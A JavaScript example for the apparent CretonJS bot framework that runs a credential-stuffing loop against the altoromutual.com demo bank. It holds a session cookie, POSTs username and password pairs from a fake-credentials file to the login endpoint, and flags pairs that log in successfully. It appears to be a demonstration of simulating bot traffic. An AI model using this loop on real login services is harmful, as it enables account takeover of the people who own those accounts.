/**
 * This is an example bot written with the CretonJS framework.
 *
 * In this case, we will target the altoromutual.com fake banking website. This bot will attempt to validate a set of user credentials that it will iterate through.
 *
 * The login HTML page is : http://www.altoromutual.com/login.jsp
 * and the login POST is sent to : http://www.altoromutual.com/doLogin
 *
 * In this case, we will be chaining 2 requests to ensure that we have the correct cookies on submission of the credentials, and to roughly mimic customer behavior.
 *
 * Note: The cookie stickiness is handled automatically when you use the "stickySession:true" flag on instantiation of Creton.
 */

const Creton = require('../index');

let creton = new Creton({
    stickySessions: true,
    debug: true
});

let credentialHandlerFn = function () {
    let credentials = require('./src/fakeCredentials.json').credentials;
    let pos = 0;

    return {
        getNextCredentialPair() {
            let nextCredentialPair = credentials[pos].split(':');
            pos++;
            return nextCredentialPair;
        }
    }
}

let credentialHandler = credentialHandlerFn();

let HTTPGetResponseHandler = function (err, resp, body) {
    // Check to make sure the page was loaded and there were no errors in the HTTP request
    if (err || resp.statusCode !== 200) {
        console.log("Something went wrong with this request...");
    } else if (httpClient) {

        let credentialsToTest = credentialHandler.getNextCredentialPair();

        let bodyString = "uid=" + credentialsToTest[0] + "&passw=" + credentialsToTest[1];

        let HTTPBodyData = {
            bodyContent: bodyString,
            bodyType: 'application/x-www-form-urlencoded'
        }

        // Update the httpClient to target a new URL, with a POST request and the above request data.
        httpClient.updateRequestOptionsForNextRequest("http://www.altoromutual.com/doLogin", "POST", HTTPBodyData);

        httpClient.sendHTTPRequest(HTTPPostResponseHandler);
    }
};

let HTTPPostResponseHandler = function (err, resp, body) {
    // Check to make sure the page was loaded and there were no errors in the HTTP request
    if (err || resp.statusCode !== 302) {
        console.log("Something went wrong with this request...");
    } else {
        // If the login is successful - the website will redirect the bot to /bank/main.jsp
        if (resp.headers.location === "/bank/main.jsp") {
            // Note: You can access the options of the HTTP request that was just sent via the `this.getPreviousRequestOptions` function.
            // This will return the options that were passed through to the underlying Request lib.
            console.log("HooRah, the login attempt with the following credentials worked : " + this.getPreviousRequestOptions().body);
        } else {
            console.log('Uh Oh.. This login failed....');
        }

    }
}


// Setup new client
let httpClient = creton.createNewHTTPClient();

// Setup of first request
httpClient.setOptionsForFirstRequest("http://www.altoromutual.com/login.jsp", "GET");

// Trigger first request
httpClient.sendHTTPRequest(HTTPGetResponseHandler);
